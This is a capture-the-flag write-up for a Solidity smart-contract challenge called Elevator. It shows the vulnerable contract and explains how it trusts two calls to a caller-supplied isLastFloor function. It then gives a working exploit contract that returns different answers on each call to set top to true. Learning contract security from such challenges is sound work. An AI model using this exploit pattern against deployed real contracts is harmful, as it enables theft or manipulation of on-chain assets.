# Elevator

>This elevator won't let you reach the top of your building. Right?
>
>Things that might help:
>* Sometimes solidity is not good at keeping promises.
>* This Elevator expects to be used from a Building.

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Interfaces in solidity are similar to abstract contracts and do not have implementation for any function. By specifying function names, parameter types, and return types without implementing the actual code, Solidity interfaces enable contracts to interact seamlessly with one another and external entities.

Here, our motive is preetty straightforward. All we have to do is make the value of the `top` variable `true`.
We can see this being achieved via the `goTo` function. This function creates an instance of `Building` with `msg.sender` address. This instance must support the `isLastFloor` function which will be used later on in the function.

If the condition is `true`, the `floor` will be made the one we specify and then the `top` variable will be set to either `true` or `false` depending upon what `isLastFloor` function returns for the second time.

Therefore, to successfully pass this level we must make this `isLastFloor` function return `false` the first time and `true` when it is called the second time.

The implementation of above plan is as follows
```solidity
contract exploit{
    Elevator e;
    constructor (address _addr){
        e = Elevator(_addr);
    }
    uint public good_num = 0;
    function hack() public {
        e.goTo(1);
    }
    function isLastFloor(uint _floor) external returns (bool) {
        bool ans = good_num==1?true:false;
        good_num++;
        return ans;
    }
}
```

The above contract can be deployed through remix using Injected MetaMask Provider and the instance address to be fed to its constructor.

When the `hack` function is called, the value of `top` changes to `true`. We can confirm this through the browser's console and then submit the instance.
